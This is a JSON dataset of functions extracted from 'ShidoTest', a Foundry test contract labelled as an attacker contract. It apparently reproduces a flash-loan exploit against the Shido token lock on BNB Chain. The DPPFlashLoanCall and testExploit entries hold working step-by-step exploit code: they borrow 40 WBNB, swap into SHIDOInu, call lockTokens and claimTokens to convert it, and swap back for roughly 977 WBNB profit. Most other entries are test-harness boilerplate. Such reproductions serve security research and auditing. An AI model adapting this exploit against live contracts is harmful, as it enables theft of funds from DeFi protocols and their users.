[
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        // Approvals\n        WBNB.approve(address(PancakeRouter), type(uint256).max);\n        SHIDOInu.approve(address(AddRemoveLiquidityForFeeOnTransferTokens), type(uint256).max);\n        SHIDOInu.approve(address(ShidoLock), type(uint256).max);\n        SHIDO.approve(address(PancakeRouter), type(uint256).max);\n\n        // Step 2. Swap WBNB (39 WBNB, 18 decimals) to obtain SHIDOInu tokens (9 decimals)\n        swapWBNBToSHIDOInu(39e18, address(AddRemoveLiquidityForFeeOnTransferTokens));\n        WBNB.withdraw(10e15);\n        swapWBNBToSHIDOInu(100e15, address(this));\n\n        AddRemoveLiquidityForFeeOnTransferTokens.addLiquidityETH{value: 0.01 ether}(\n            address(SHIDOInu), 1e9, 1, 1, address(this), block.timestamp + 100\n        );\n\n        // Step 3. Sequentially invoke lockTokens() and claimTokens() to convert SHIDOInu to standard SHIDO tokens (18 decimals)\n        ShidoLock.lockTokens();\n        ShidoLock.claimTokens();\n\n        // Step 4. Swap all SHIDO tokens to WBNB. Due to price difference between pools attacker has gained ~977 WBNB tokens\n        swapSHIDOToWBNB();\n\n        // Step 5. Repay flashloan\n        WBNB.transfer(address(DPPAdvanced), baseAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 29_365_171);\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(SHIDOInu), \"SHIDOInu\");\n        cheats.label(address(SHIDO), \"SHIDO\");\n        cheats.label(address(DPPAdvanced), \"DPPAdvanced\");\n        cheats.label(address(PancakeRouter), \"PancakeRouter\");\n        cheats.label(address(AddRemoveLiquidityForFeeOnTransferTokens), \"AddRemoveLiquidityForFeeOnTransferTokens\");\n        cheats.label(address(ShidoLock), \"ShidoLock\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShidoTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Start] WBNB amount before attack\", WBNB.balanceOf(address(this)), WBNB.decimals());\n        // Step 1. Borrow flash loan (40 WBNB)\n        DPPAdvanced.flashLoan(40e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] WBNB amount after attack\", WBNB.balanceOf(address(this)), WBNB.decimals());\n    }\n\n",
    "description": ""
  }
]